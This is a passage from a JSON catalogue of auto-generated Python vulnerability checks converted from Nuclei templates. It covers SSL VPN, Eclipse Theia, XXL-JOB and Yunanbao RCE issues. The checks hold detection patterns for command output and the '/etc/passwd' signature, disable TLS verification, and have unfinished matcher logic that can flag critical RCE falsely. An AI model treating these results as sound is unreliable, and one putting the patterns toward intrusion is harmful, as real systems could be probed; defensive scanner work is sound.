ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: sslvpn-client-rce\nName: SSL VPN Client - Remote Code Execution\nSeverity: critical\nDescription: SSL VPN Client is vulnerable to RCE.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_sslvpn_client_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"sslvpn-client-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"SSL VPN Client - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] regex ['uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)'] | mot(s) 'text/plain'\"\n\n        # Simple word matcher simulation\n        matchers = ['uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)', 'text/plain']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"SSL VPN Client - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_sslvpn_client_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "sslvpn",
          "rce",
          "intrusive",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_theia_lfi_to_rce",
        "name": "Eclipse Theia IDE - LFI to RCE",
        "language": "Python",
        "famille": "WebApp",
        "description": "Detected Eclipse Theia IDE was exposed without authentication, allowing unauthenticated attackers to access the web-based IDE with terminal capabilities, file system access, and arbitrary command execution.",
        "severity": "critical",
        "detection": "[AND] regex ['root:.*:0:0:'] | status HTTP [200]",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: theia-lfi-to-rce\nName: Eclipse Theia IDE - LFI to RCE\nSeverity: critical\nDescription: Detected Eclipse Theia IDE was exposed without authentication, allowing unauthenticated attackers to access the web-based IDE with terminal capabilities, file system access, and arbitrary command execution.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_theia_lfi_to_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"theia-lfi-to-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Eclipse Theia IDE - LFI to RCE\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] regex ['root:.*:0:0:'] | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['root:.*:0:0:']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Eclipse Theia IDE - LFI to RCE\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_theia_lfi_to_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: theia-lfi-to-rce\nName: Eclipse Theia IDE - LFI to RCE\nSeverity: critical\nDescription: Detected Eclipse Theia IDE was exposed without authentication, allowing unauthenticated attackers to access the web-based IDE with terminal capabilities, file system access, and arbitrary command execution.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_theia_lfi_to_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"theia-lfi-to-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Eclipse Theia IDE - LFI to RCE\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] regex ['root:.*:0:0:'] | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['root:.*:0:0:']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Eclipse Theia IDE - LFI to RCE\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_theia_lfi_to_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "theia",
          "ide",
          "lfi",
          "file-read",
          "unauth",
          "rce"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_xxljob_executor_unauth",
        "name": "XXL-JOB executor - Unauthorized Access",
        "language": "Python",
        "famille": "Misconfiguration",
        "description": "XXL-JOB is a distributed task scheduling platform. Its core design goals are rapid development, easy learning, lightweight, and easy expansion. The source code is now open and connected to the online product lines of many companies, ready to use out of the box. XXL-JOB is divided into two ends: admin and executor. The former is the background management page, and the latter is the client for task execution. The executor is not configured with authentication by default, and unauthorized attackers can execute arbitrary commands through the RESTful API.",
        "severity": "critical",
        "detection": "[AND] mot(s) '{\"code\":200}' | status HTTP [200] | mot(s) 'dns'",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "interactsh",
            "datatype": "string",
            "required": false,
            "description": "URL Interactsh OOB"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: xxljob-executor-unauth\nName: XXL-JOB executor - Unauthorized Access\nSeverity: critical\nDescription: XXL-JOB is a distributed task scheduling platform. Its core design goals are rapid development, easy learning, lightweight, and easy expansion. The source code is now open and connected to the online product lines of many companies, ready to use out of the box. XXL-JOB is divided into two ends: admin and executor. The former is the background management page, and the latter is the client for task execution. The executor is not configured with authentication by default, and unauthorized attackers can execute arbitrary commands through the RESTful API.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_xxljob_executor_unauth:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"xxljob-executor-unauth\"\n    SEVERITY = \"critical\"\n    NAME = \"XXL-JOB executor - Unauthorized Access\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[AND] mot(s) \\'{\"code\":200}\\' | status HTTP [200] | mot(s) \\'dns\\''\n\n        # Simple word matcher simulation\n        matchers = ['{\"code\":200}', 'dns']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"XXL-JOB executor - Unauthorized Access\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_xxljob_executor_unauth(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: xxljob-executor-unauth\nName: XXL-JOB executor - Unauthorized Access\nSeverity: critical\nDescription: XXL-JOB is a distributed task scheduling platform. Its core design goals are rapid development, easy learning, lightweight, and easy expansion. The source code is now open and connected to the online product lines of many companies, ready to use out of the box. XXL-JOB is divided into two ends: admin and executor. The former is the background management page, and the latter is the client for task execution. The executor is not configured with authentication by default, and unauthorized attackers can execute arbitrary commands through the RESTful API.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_xxljob_executor_unauth:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"xxljob-executor-unauth\"\n    SEVERITY = \"critical\"\n    NAME = \"XXL-JOB executor - Unauthorized Access\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[AND] mot(s) \\'{\"code\":200}\\' | status HTTP [200] | mot(s) \\'dns\\''\n\n        # Simple word matcher simulation\n        matchers = ['{\"code\":200}', 'dns']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"XXL-JOB executor - Unauthorized Access\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_xxljob_executor_unauth(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "xxljob",
          "unauth",
          "misconfig",
          "rce",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_yunanbao_rce",
        "name": "Yunanbao Cloud Box FastJson - Deserialization Remote Code Execution",
        "language": "Python",
        "famille": "WebApp",
        "description": "The authService interface of Cloud Box uses the vulnerable fastjson component. Unauthorized attackers can launch attacks on Cloud Box through the fastjson serialization vulnerability to obtain server permissions.",
        "severity": "critical",
        "detection": "[AND] regex ['uid=([a-z=0-9() ]+) gid=([a-z=0-9() ]+) groups=([a-z=0-9() ]+)'] | status HTTP [200]",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
